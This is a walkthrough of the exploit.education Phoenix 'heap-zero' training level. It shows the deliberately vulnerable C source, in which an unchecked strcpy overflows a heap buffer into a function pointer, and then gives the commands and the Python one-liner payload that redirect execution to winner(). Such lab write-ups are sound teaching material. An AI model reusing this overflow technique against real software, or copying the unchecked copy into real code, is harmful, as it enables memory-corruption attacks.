# HEAP ZERO


## SOURCE CODE

```c
/*
 * phoenix/heap-zero, by https://exploit.education
 *
 * Can you hijack flow control, and execute the winner function?
 *
 * Why do C programmers make good Buddhists?
 * Because they're not object orientated.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

struct data {
  char name[64];
};

struct fp {
  void (*fp)();
  char __pad[64 - sizeof(unsigned long)];
};

void winner() {
  printf("Congratulations, you have passed this level\n");
}

void nowinner() {
  printf(
      "level has not been passed - function pointer has not been "
      "overwritten\n");
}

int main(int argc, char **argv) {
  struct data *d;
  struct fp *f;

  printf("%s\n", BANNER);

  if (argc < 2) {
    printf("Please specify an argument to copy :-)\n");
    exit(1);
  }

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  strcpy(d->name, argv[1]);

  printf("data is at %p, fp is at %p, will be calling %p\n", d, f, f->fp);
  fflush(stdout);

  f->fp();

  return 0;
}
```


## STRATEGY
The goal is overwrite the *`fp`* pointer that points to *`nowinner`* function with the address of *`winner`*, which will be called later. In a similar way to buffer overflow, we can create an overflow in the segment of the heap where our dynamically allocated variables reside. To do that we need to get the address of *`winner`* and calculate how much memory write before encounter *`fp`* pointer

## EXPLOIT
1. With objdump we can get winner address:
```shell
user@phoenix-amd64:/opt/phoenix/i486$ objdump -d heap-zero | grep winner
08048835 <winner>:
0804884e <nowinner>:
```
address: 08048835

2. With gdb (*`pattern create`* - *`pattern offset`*) or a site like [THIS](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), we can create segmentation fault. Inspecting the segfault we can get the ip offset.
```shell
user@phoenix-amd64:/opt/phoenix/i486$ ./heap-zero `python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"'`
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x41346341
Segmentation fault
user@phoenix-amd64:/opt/phoenix/i486$ sudo dmesg |tail -n1
[ 7096.776476] heap-zero[382]: segfault at 41346341 ip 0000000041346341 sp 00000000ffffd55c error 14
```
Number of bytes to fill before *`fp`* pointer: 72


3. Exploit:
```python
./heap-zero `python -c 'import struct; print "A"*72 + struct.pack("I",0x08048835)'`
```

